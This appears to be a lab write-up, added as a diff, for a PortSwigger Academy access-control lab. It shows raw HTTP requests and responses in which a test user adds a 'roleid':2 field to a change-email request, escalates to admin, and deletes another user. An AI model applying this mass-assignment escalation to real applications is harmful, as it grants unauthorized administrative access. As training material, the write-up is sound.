@@ -1,0 +1,92 @@
+#+title: User role can be modified in user profile
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+#+description: Access Control Labs from Portswigger
+#+date: 2023-08-11 Fri
+#+options: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab contain]]
+- [[#end-goal][End Goal]]
+- [[#exploit][Exploit]]
+  - [[#steps-to-exploit][Steps to exploit]]
+
+* Lab contain
+- has =admin= panel at =/admin= location
+- but with =roleid=2= user can only access the admin panel
+* End Goal
+- access admin panel
+- delete user =carlos=
+* Exploit 
+*** Test account
+- username: wiener
+- password: peter
+** Steps to exploit
+- access the lab
+- login with test account
+- use update email feature of the user profile and intercept the request in the burpsuite
+*** Request 
+#+begin_src request
+POST /my-account/change-email HTTP/2
+Host: 0afd0095044a9de587acd8050002003a.web-security-academy.net
+Cookie: session=M3JveREeG0ZX8AM3qUOhIW250L3AvQuP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 25
+Origin: https://0afd0095044a9de587acd8050002003a.web-security-academy.net
+Dnt: 1
+Referer: https://0afd0095044a9de587acd8050002003a.web-security-academy.net/my-account?id=wiener
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Sec-Gpc: 1
+Te: trailers
+
+{"email":"test@test.com"}
+#+end_src>
+*** Respose
+#+begin_src response
+HTTP/2 302 Found
+Location: /my-account
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 117
+{
+  "username": "wiener",
+  "email": "test@test.com",
+  "apikey": "mTPDvD0c2GWX2ZDkKn6WF7qEguUzHyoO",
+  "roleid": 1
+}
+#+end_src
+
+/Here we can see that it has roleid property. but in the request body we did not see this./
+- Now if we change this =roleid: 1= from =roleid: 2= through email update request
+#+begin_src 
+POST /my-account/change-email HTTP/2
+Host: 0afd0095044a9de587acd8050002003a.web-security-academy.net
+Cookie: session=M3JveREeG0ZX8AM3qUOhIW250L3AvQuP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 38
+Origin: https://0afd0095044a9de587acd8050002003a.web-security-academy.net
+Dnt: 1
+Referer: https://0afd0095044a9de587acd8050002003a.web-security-academy.net/my-account?id=wiener
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Sec-Gpc: 1
+Te: trailers
+
+{
+  "email":"test@test.com",
+  "roleid":2
+}
+#+end_src
+
+Now go to account page. Ha! Admin panel is here. User =wiener= become an =admin= user
+- go to =admin= panel and delete the user =carlos=
